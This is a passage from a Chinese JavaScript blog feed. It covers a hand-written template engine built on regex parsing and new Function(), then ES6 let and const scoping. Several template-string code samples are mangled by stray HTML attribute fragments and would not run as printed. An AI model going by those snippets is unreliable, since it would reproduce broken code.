class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;最简单的方式就是通过replace函数了：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> result = tpl.<span class="built_in">replace</span>(<span class="regexp">/&lt;%([^%&gt;]+)?%&gt;/g</span>, <span class="keyword">function</span>(<span class="params">s0, s1</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> data[s1];</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;通过正则替换，我们很轻松的拿到了result，你可以去试一试，他正式我们想要的结果。但是这里又有了一个问题，改一下data和tpl，</p><figure class="highlight lasso"><table><tr><td class="code"><pre><span class="line"><span class="built_in">var</span> tpl = <span class="string">&#x27;Hei, my name is &lt;%name%&gt;, and I\&#x27;m &lt;%info.age%&gt; years old.&#x27;</span>;</span><br><span class="line"><span class="built_in">var</span> <span class="built_in">data</span> = &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Barret Lee&quot;</span>,</span><br><span class="line">    <span class="string">&quot;info&quot;</span>: &#123; age<span class="string">&quot;: &quot;</span><span class="number">20</span><span class="string">&quot;&#125;</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>&nbsp;再用上面的方式去获取结果，呵呵，不行了吧~ 这里data["info.age"]本身就是undefined，所以我们需要换一种方式来处理这个问题，那就是将它转换成真正的JS代码。如：</p><figure class="highlight lasso"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="string">&#x27;Hei, my name is &#x27;</span> + <span class="built_in">data</span>.name + <span class="string">&#x27;, and I\&#x27;m &#x27;</span> + <span class="built_in">data</span>.info.age<span class="string">&#x27; + &#x27;</span> years old.<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>&nbsp;但是接着又有一个问题来了，当我们的代码中出现for循环和if的时候，上面的转换明显是不起作用的，如：</p><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> tpl = &#x27;Posts: &#x27; +</span><br><span class="line">          &#x27;&lt;% <span class="keyword">for</span>(<span class="keyword">var</span>=<span class="string">&quot;&quot;</span> i=<span class="string">&quot;0;&quot;</span> &lt;=<span class="string">&quot;&quot;</span> <span class="keyword">post</span>.length;=<span class="string">&quot;&quot;</span> i++)=<span class="string">&quot;&quot;</span> &#123;&#x27;+=<span class="string">&quot;&quot;</span> &#x27;&lt;a=<span class="string">&quot;&quot;</span> href=<span class="string">&quot;#&quot;</span>&gt;&lt;% <span class="keyword">post</span>[i].expert=<span class="string">&quot;&quot;</span> %=<span class="string">&quot;&quot;</span>&gt;&#x27; +</span><br><span class="line">          &#x27;&lt;% &#125;=<span class="string">&quot;&quot;</span> %=<span class="string">&quot;&quot;</span>&gt;&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;如果继续采用上面的方式，得到的结果便是：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="string">&#x27;Posts: &#x27;</span> +</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; post.<span class="built_in">length</span>; i++) &#123; +</span><br><span class="line">         <span class="string">&#x27;&lt;a href=&quot;#&quot;&gt;&#x27;</span> + post[i].exper + <span class="string">&#x27;&lt;/a&gt;&#x27;</span> +</span><br><span class="line">       &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;这显然不是我们愿意看到的，稍微观察一下上面的结构，如果可以返回一个这样的结果也挺不错哦：</p><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;Posts: &#x27;</span></span><br><span class="line"><span class="function"><span class="title">for</span><span class="params">(var i = <span class="number">0</span>; i &lt; post.length; i++)</span></span> &#123;</span><br><span class="line">    <span class="string">&#x27;&lt;a href=&quot;#&quot;&gt;&#x27;</span> + post<span class="selector-attr">[i]</span><span class="selector-class">.exper</span> + <span class="string">&#x27;&lt;/a&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;但是我们需要得到的是一个字符串，而不是上面这样零散的片段，因此可以把这些东西装入数组中。</p><h4>2.装入数组</h4><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> r = [];</span><br><span class="line">r.<span class="built_in">push</span>(<span class="string">&#x27;Posts: &#x27;</span> );</span><br><span class="line">r.<span class="built_in">push</span>(<span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; post.<span class="built_in">length</span>; i++) &#123;);</span><br><span class="line">r.<span class="built_in">push</span>(<span class="string">&#x27;&lt;a href=&quot;#&quot;&gt;&#x27;</span>);</span><br><span class="line">r.<span class="built_in">push</span>(post[i].exper);</span><br><span class="line">r.<span class="built_in">push</span>(<span class="string">&#x27;&lt;/a&gt;&#x27;</span>);</span><br><span class="line">r.<span class="built_in">push</span>(&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;有人看到上面的代码就要笑了，第三行和最后一行代码的逻辑明显是不正确的嘛，那肿么办呢？呵呵，很简单，不放进去就行了呗，</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> r = [];</span><br><span class="line">r.<span class="built_in">push</span>(<span class="string">&#x27;Posts: &#x27;</span> );</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; post.<span class="built_in">length</span>; i++) &#123;</span><br><span class="line">    r.<span class="built_in">push</span>(<span class="string">&#x27;&lt;a href=&quot;#&quot;&gt;&#x27;</span>);</span><br><span class="line">    r.<span class="built_in">push</span>(post[i].exper);</span><br><span class="line">    r.<span class="built_in">push</span>(<span class="string">&#x27;&lt;/a&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;这样的逻辑就十分完善了，不存在太多的漏洞，但是这个转化的过程是如何实现的？我们必须还是要写一个解析的模板函数出来。</p><h4>3.分辨js逻辑部分</h4><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> r = [];</span><br><span class="line">tpl.<span class="built_in">replace</span>(<span class="regexp">/&lt;%([^%&gt;]+)?%&gt;/g</span>, <span class="keyword">function</span>(<span class="params">s0, s1</span>)&#123;</span><br><span class="line">    <span class="comment">//完蛋了，这里貌似又要回到上面那可笑的逻辑有错误的一步啦... 该怎么处理比较好？</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;完蛋了，这里貌似又要回到上面那可笑的逻辑有错误的一步啦... 该怎么处理比较好？我们知道，JS给我们提供了构造函数的\类"，</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="function"><span class="keyword">fn</span> = <span class="title">new</span> <span class="title">Function</span>(<span class="params"><span class="string">&quot;data&quot;</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="string">&quot;var r = []; for(var i in data)&#123; r.push(data[i]); &#125; return r.join(&#x27; &#x27;)&quot;</span></span>)</span>;</span><br><span class="line"><span class="function"><span class="keyword">fn</span>(<span class="params">&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;barretlee&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="string">&quot;20&quot;</span>&#125;</span>)</span>; <span class="comment">// barretlee 20</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;知道了这个就好办了，我们可以把逻辑部分和非逻辑部分的代码链接成一个字符串，然后利用类似fn的函数直接编译代码。而<code>/&lt;%([^%&gt;]+)?%&gt;/g</code>，这一个正则只能把逻辑部分匹配出来，要想把所有的代码都组合到一起，必须还得匹配非逻辑部分代码。replace函数虽然很强大，他也可以完成这个任务，但是实现的逻辑比较晦涩，所以我们换另外一种方式来处理。</p><p>先看一个简单的例子：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/&lt;%([^%&gt;]+)?%&gt;/g</span>;</span><br><span class="line"><span class="keyword">var</span> tpl = <span class="string">&#x27;Hei, my name is &lt;%name%&gt;, and I\&#x27;m &lt;%age%&gt; years old.&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> match = reg.exec(tpl);</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(match);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;看到的是：</p><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    <span class="number">0</span>: <span class="string">&quot;&lt;%name%&gt;&quot;</span>,</span><br><span class="line">    <span class="number">1</span>: name,</span><br><span class="line"><span class="symbol">    index:</span> <span class="number">16</span>,</span><br><span class="line"><span class="symbol">    input:</span> <span class="string">&quot;Hei, my name is &lt;%name%&gt;, and I&#x27;m &lt;%age%&gt; years old.&quot;</span></span><br><span class="line"><span class="symbol">    length:</span> <span class="number">2</span></span><br><span class="line">]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;这。。。我们可是想得到所有的匹配啊，他竟然只获取了name而忽略了后面的age，好吧，对正则稍微熟悉点的童鞋一定会知道应该这样处理：</p><figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">var reg = /&lt;%([^%&gt;]+)?%&gt;/g;</span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">match</span> = reg.<span class="keyword">exec</span>(tpl)) &#123;</span><br><span class="line">    console.<span class="keyword">log</span>(<span class="keyword">match</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;关于正则表达式的内容就不在这里细说了，有兴趣的同学可以多去了解下match,exec,search等正则的相关函数。这里主要是靠match的index属性来定位遍历位置，然后利用while循环获取所有的内容。</p><h4>4.引擎函数</h4><p>所以我们的引擎函数雏形差不多就出来了：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> tplEngine = <span class="keyword">function</span>(<span class="params">tpl, data</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> reg = <span class="regexp">/&lt;%([^%&gt;]+)?%&gt;/g</span>,</span><br><span class="line">            code = <span class="string">&#x27;var r=[];\n&#x27;</span>,</span><br><span class="line">            cursor = <span class="number">0</span>;  <span class="comment">//主要的作用是定位代码最后一截</span></span><br><span class="line">    <span class="keyword">var</span> add = <span class="keyword">function</span>(<span class="params">line</span>) &#123;</span><br><span class="line">        code += <span class="string">&#x27;r.push(&quot;&#x27;</span> + line.<span class="built_in">replace</span>(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;\\&quot;&#x27;</span>) + <span class="string">&#x27;&quot;);\n&#x27;</span>;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(match = reg.exec(tpl)) &#123;</span><br><span class="line">        add(tpl.<span class="built_in">slice</span>(cursor, match.index)); <span class="comment">//添加非逻辑部分</span></span><br><span class="line">        add(match[<span class="number">1</span>]);  <span class="comment">//添加逻辑部分 match[0] = &quot;&lt;%&quot; +=&quot;&quot; match[1]=&quot;&quot; &quot;%=&quot;&quot;&gt;&quot;;</span></span><br><span class="line">        cursor = match.index + match[<span class="number">0</span>].<span class="built_in">length</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    add(tpl.substr(cursor, tpl.<span class="built_in">length</span> - cursor)); <span class="comment">//代码的最后一截 如:&quot; years old.&quot;</span></span><br><span class="line"></span><br><span class="line">    code += <span class="string">&#x27;return r.join(&quot;&quot;);&#x27;</span>; <span class="comment">// 返回结果，在这里我们就拿到了装入数组后的代码</span></span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(code);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tpl;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;这样一来，测试一个小demo:</p><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">var</span> tpl = &#x27;&lt;% <span class="keyword">for</span>(<span class="keyword">var</span>=<span class="string">&quot;&quot;</span> i=<span class="string">&quot;0;&quot;</span> &lt;=<span class="string">&quot;&quot;</span> this.posts.length;=<span class="string">&quot;&quot;</span> i++)=<span class="string">&quot;&quot;</span> &#123;&#x27;=<span class="string">&quot;&quot;</span> +　=<span class="string">&quot;&quot;</span> &#x27;<span class="keyword">var</span>=<span class="string">&quot;&quot;</span> <span class="keyword">post</span>=<span class="string">&quot;posts[i];&quot;</span> %=<span class="string">&quot;&quot;</span>&gt;&#x27; +</span><br><span class="line">        &#x27;&lt;% <span class="keyword">if</span>(!<span class="keyword">post</span>.expert)&#123;=<span class="string">&quot;&quot;</span> %=<span class="string">&quot;&quot;</span>&gt;&#x27; +</span><br><span class="line">            &#x27;&lt;span&gt;<span class="keyword">post</span> is null&lt;/span&gt;&#x27; +</span><br><span class="line">        &#x27;&lt;% &#125;=<span class="string">&quot;&quot;</span> <span class="keyword">else</span>=<span class="string">&quot;&quot;</span> &#123;=<span class="string">&quot;&quot;</span> %=<span class="string">&quot;&quot;</span>&gt;&#x27; +</span><br><span class="line">            &#x27;&lt;a href=<span class="string">&quot;#&quot;</span>&gt;&lt;% <span class="keyword">post</span>.expert=<span class="string">&quot;&quot;</span> %=<span class="string">&quot;&quot;</span>&gt; at &lt;% <span class="keyword">post</span>.time=<span class="string">&quot;&quot;</span> %=<span class="string">&quot;&quot;</span>&gt;&lt;/%&gt;&lt;/%&gt;&lt;/a&gt;&#x27; +</span><br><span class="line">        &#x27;&lt;% &#125;=<span class="string">&quot;&quot;</span> %=<span class="string">&quot;&quot;</span>&gt;&#x27; +</span><br><span class="line">    &#x27;&lt;% &#125;=<span class="string">&quot;&quot;</span> %=<span class="string">&quot;&quot;</span>&gt;&#x27;;</span><br><span class="line">tplEngine(tpl, data);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;返回的结果让人很满意：</p><figure class="highlight nsis"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="variable">r</span>=[]<span class="comment">;</span></span><br><span class="line">r.<span class="keyword">push</span>(<span class="string">&quot;&quot;</span>)<span class="comment">;</span></span><br><span class="line">r.<span class="keyword">push</span>(<span class="string">&quot; for(var i = 0; i &lt; this.posts.length; i++) &#123;var post = posts[i]; &quot;</span>)<span class="comment">;</span></span><br><span class="line">r.<span class="keyword">push</span>(<span class="string">&quot;&quot;</span>)<span class="comment">;</span></span><br><span class="line">r.<span class="keyword">push</span>(<span class="string">&quot; if(!post.expert)&#123; &quot;</span>)<span class="comment">;</span></span><br><span class="line">r.<span class="keyword">push</span>(<span class="string">&quot;&lt;span&gt;post is null&lt;/span&gt;&quot;</span>)<span class="comment">;</span></span><br><span class="line">r.<span class="keyword">push</span>(<span class="string">&quot; &#125; else &#123; &quot;</span>)<span class="comment">;</span></span><br><span class="line">r.<span class="keyword">push</span>(<span class="string">&quot;&lt;a href=&quot;</span>\<span class="string">&quot;#\&quot;</span><span class="string">&quot;&gt;&quot;</span>)<span class="comment">;</span></span><br><span class="line">r.<span class="keyword">push</span>(<span class="string">&quot; post.expert &quot;</span>)<span class="comment">;</span></span><br><span class="line">r.<span class="keyword">push</span>(<span class="string">&quot; at &quot;</span>)<span class="comment">;</span></span><br><span class="line">r.<span class="keyword">push</span>(<span class="string">&quot; post.time &quot;</span>)<span class="comment">;</span></span><br><span class="line">r.<span class="keyword">push</span>(<span class="string">&quot;&lt;/a&gt;&quot;</span>)<span class="comment">;</span></span><br><span class="line">r.<span class="keyword">push</span>(<span class="string">&quot; &#125; &quot;</span>)<span class="comment">;</span></span><br><span class="line">r.<span class="keyword">push</span>(<span class="string">&quot;&quot;</span>)<span class="comment">;</span></span><br><span class="line">r.<span class="keyword">push</span>(<span class="string">&quot; &#125; &quot;</span>)<span class="comment">;</span></span><br><span class="line">r.<span class="keyword">push</span>(<span class="string">&quot;&quot;</span>)<span class="comment">;</span></span><br><span class="line"><span class="keyword">return</span> r.join(<span class="string">&quot;&quot;</span>)<span class="comment">; </span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;不过我们并需要for，if，switch等这些东西也push到r数组中去，所以呢，还得改善下上面的代码，如果在line中发现了包含js逻辑的代码，我们就不应该让他进门：</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">regOut = /(^( )?(<span class="keyword">if</span>|<span class="keyword">for</span>|<span class="keyword">else</span>|switch|<span class="keyword">case</span>|break|&#123;|&#125;))(.*)?/g;</span><br><span class="line">var <span class="keyword">add</span> = <span class="keyword">function</span>(<span class="type">line</span>, js) &#123;</span><br><span class="line">    js? code += <span class="type">line</span>.match(regOut) ? <span class="type">line</span> + <span class="string">&#x27;\n&#x27;</span> : <span class="string">&#x27;r.push(&#x27;</span> + <span class="type">line</span> + <span class="string">&#x27;);\n&#x27;</span> :</span><br><span class="line">        code += <span class="string">&#x27;r.push(&quot;&#x27;</span> + <span class="type">line</span>.replace(/&quot;/g, &#x27;\\&quot;<span class="string">&#x27;) + &#x27;</span>&quot;);\n&#x27;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;所以我们只剩下最后一步工作了，把data扔进去！</p><h4>5.把data扔进去</h4><p>没有比完成这东西更简单的事情啦，通过上面对Function这个函数的讲解，大家应该也知道怎么做了。</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">Function</span>(<span class="params">code</span>).<span class="title function_">apply</span>(<span class="params">data</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;使用apply的作用就是让code中的一些变量作用域绑定到data上，不然作用域就会跑到global上，这样得到的数据索引就会出问题啦~ 当然我们可以再优化一下：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">Function</span>(<span class="params">code.replace(<span class="regexp">/[\r\t\n]/g</span>, <span class="string">&#x27;&#x27;</span></span>)).<span class="title function_">apply</span>(<span class="params">data</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&nbsp;把回车换行以及tab键都给匹配掉，让代码更加干净一点。那么最终的代码就是：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> tplEngine = <span class="keyword">function</span>(<span class="params">tpl, data</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> reg = <span class="regexp">/&lt;%([^%&gt;]+)?%&gt;/g</span>,</span><br><span class="line">        regOut = <span class="regexp">/(^( )?(if|for|else|switch|case|break|&#123;|&#125;))(.*)?/g</span>,</span><br><span class="line">        code = <span class="string">&#x27;var r=[];\n&#x27;</span>,</span><br><span class="line">        cursor = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> add = <span class="keyword">function</span>(<span class="params">line, js</span>) &#123;</span><br><span class="line">        js? (code += line.match(regOut) ? line + <span class="string">&#x27;\n&#x27;</span> : <span class="string">&#x27;r.push(&#x27;</span> + line + <span class="string">&#x27;);\n&#x27;</span>) :</span><br><span class="line">            (code += line != <span class="string">&#x27;&#x27;</span> ? <span class="string">&#x27;r.push(&quot;&#x27;</span> + line.<span class="built_in">replace</span>(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;\\&quot;&#x27;</span>) + <span class="string">&#x27;&quot;);\n&#x27;</span> : <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> add;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(match = reg.exec(tpl)) &#123;</span><br><span class="line">        add(tpl.<span class="built_in">slice</span>(cursor, match.index))(match[<span class="number">1</span>], <span class="literal">true</span>);</span><br><span class="line">        cursor = match.index + match[<span class="number">0</span>].<span class="built_in">length</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    add(tpl.substr(cursor, tpl.<span class="built_in">length</span> - cursor));</span><br><span class="line">    code += <span class="string">&#x27;return r.join(&quot;&quot;);&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">Function</span>(<span class="params">code.replace(<span class="regexp">/[\r\t\n]/g</span>, <span class="string">&#x27;&#x27;</span></span>)).<span class="title function_">apply</span>(<span class="params">data</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3>三、应用场景</h3><p>毕竟是前端代码，所以写出来是要为前端服务的，平时我们处理的一般是一个html的模板，通常的情况下，模板代码是放在script标签或者textarea中，所以首先是要获取到这里头的东西，然后再来做解析。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> barretTpl = <span class="keyword">function</span>(<span class="params">str, data</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取元素</span></span><br><span class="line">    <span class="keyword">var</span> element = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(str);</span><br><span class="line">    <span class="keyword">if</span> (element) &#123;</span><br><span class="line">        <span class="comment">//textarea或input则取value，其它情况取innerHTML</span></span><br><span class="line">        <span class="keyword">var</span> html = <span class="regexp">/^(textarea|input)$/i</span>.<span class="title function_">test</span>(element.<span class="property">nodeName</span>) ? element.<span class="property">value</span> : element.<span class="property">innerHTML</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">tplEngine</span>(html, data);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//是模板字符串，则生成一个函数</span></span><br><span class="line">        <span class="comment">//如果直接传入字符串作为模板，则可能变化过多，因此不考虑缓存</span></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">tplEngine</span>(str, data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> tplEngine = <span class="keyword">function</span>(<span class="params">tpl, data</span>) &#123;</span><br><span class="line">        <span class="comment">// content above</span></span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样一来就更加简单了，使用方式就是 <code>barretTpl(str, data)</code>， 这里的str可以是模板代码，也可以是一个DOM元素的id~ 可以看看这两段代码：<a href="//gist.github.com/barretlee/7765698" target="_blank">//gist.github.com/barretlee/7765698</a>, <a href="//gist.github.com/barretlee/7765587" target="_blank">//gist.github.com/barretlee/7765587</a></p><p>也可以直接戳这个<a href="http://qianduannotes.duapp.com/demo/javascript-template.html" target="_blank">demo</a>。</p><h3>四、优化以及功能拓展</h3><p>总共就三四十行代码，完成的东西肯定是一个简洁版的，不过对于一个简单的页面而言，这几行代码已经足够使用了，如果还想对他做优化，可以从这几个方面考虑：</p><ul><li>优化获取的模板代码，比如去掉行尾空格等</li><li>符号转义，如果我们想输出<code>&lt;span&gt;hehe&lt;/span&gt;</code>类似这样的源代码，在push之前必须进行转义</li><li>代码缓存，如果一个模板会经常使用，可以将它用一个数组缓存在barretTpl闭包内</li><li>用户自己设置分隔符</li></ul><h3>五、参考资料</h3><p>[1]&nbsp;<a href="http://tech.pro/tutorial/1743/javascript-template-engine-in-just-20-lines" target="_blank">http://tech.pro/tutorial/1743/javascript-template-engine-in-just-20-lines</a>&nbsp;&nbsp;Krasimir Tsonev&nbsp;</p><p>[2]&nbsp;<a href="http://tangram.baidu.com/BaiduTemplate/" target="_blank">http://tangram.baidu.com/BaiduTemplate/</a>&nbsp; JS template</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> 模板引擎 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ECMAScript 6中的let和const关键词</title>
      <link href="/blog/2013/11/28/cb-ES6-computed-properties/"/>
      <url>/blog/2013/11/28/cb-ES6-computed-properties/</url>
      
        <content type="html"><![CDATA[<p>ECMAScript 6中多了两个定义变量的关键词，一个是<a href="http://wiki.ecmascript.org/doku.php?id=harmony:let" target="_blank">let</a>，另一个是<a href="http://wiki.ecmascript.org/doku.php?id=harmony:const" target="_blank">const</a>，后者顾名思义就是常量定义，前者的作用域范围是块级的。</p><p>一般写过js的童鞋都知道，同其他语言一样，JS中的变量作用域是函数域而不是块级分割的，但是涉及到变量提升（hosting），闭包等问题的时候，很多有经验的程序员依然会头疼。</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(a);<span class="comment">//10</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><span>上面的结果是10，但是我们看到，在if block内外都有一个a的定义，按我们正常的理解来看，这两个a应该占用的是不同的内存，而事实上，他们共用同一个内存。为此，ES 6中的let关键词\修复"了这个问题。</span></p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">let a <span class="operator">=</span> <span class="number">5</span><span class="comment">;</span></span><br><span class="line">if(true)&#123;</span><br><span class="line">    let a <span class="operator">=</span> <span class="number">10</span><span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">console.log(a)<span class="comment">; //5</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><span>let作用在块级作用域中，所以不管是switch还是if还是for，只要是let定义的变量，他就只能在那个花括号内部起作用。let是一个让程序员比较省心的一个关键词，而还有一个令人兴奋的关键词是let的兄弟const，一旦定义一个变量为const类型，后面就不能对他进行修改。</span></p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">const aa <span class="operator">=</span> <span class="number">11</span><span class="comment">;</span></span><br><span class="line">alert(aa) //<span class="number">11</span></span><br><span class="line"><span class="attribute">aa</span> <span class="operator">=</span> <span class="number">22</span><span class="comment">;</span></span><br><span class="line">alert(aa) //<span class="number">11</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><span>关于这两者的兼容性问题，可以到这里查看</span><a href="http://kangax.github.io/es5-compat-table/es6/" target="_blank">http://kangax.github.io/es5-compat-table/es6/</a></p><p>Node已经支持了const和let关键词，可以这样使用<code>node --harmony</code>和<code>use strict</code>。目前一些浏览器还不支持这样的写法，但是利用defs.js这个库可以ES3也支持这个。他的原理就是利用<a href="//github.com/ariya/esprima" target="_blank">esprima</a>来编译并重写你的代码。比如：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> y = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> x = <span class="number">0</span>; x &lt; <span class="number">10</span>; x++) &#123;</span><br><span class="line">        <span class="keyword">const</span> y = x * <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">const</span> z = y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(y); <span class="comment">// prints 0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">fn</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><span>经过def.js重新编译之后变成：</span></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> y = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> x = <span class="number">0</span>; x &lt; <span class="number">10</span>; x++) &#123;</span><br><span class="line">        <span class="keyword">var</span> y$0 = x * <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">var</span> z = y$0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(y); <span class="comment">// prints 0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">fn</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><span>详情可以去</span><a href="//github.com/olov/defs" target="_blank">//github.com/olov/defs</a><span>这里瞅瞅。</span></p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> ES6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ECMAScript 6 简介</title>
      <link href="/blog/2013/11/26/cb-ES6-introduce/"/>
      <url>/blog/2013/11/26/cb-ES6-introduce/</url>
      
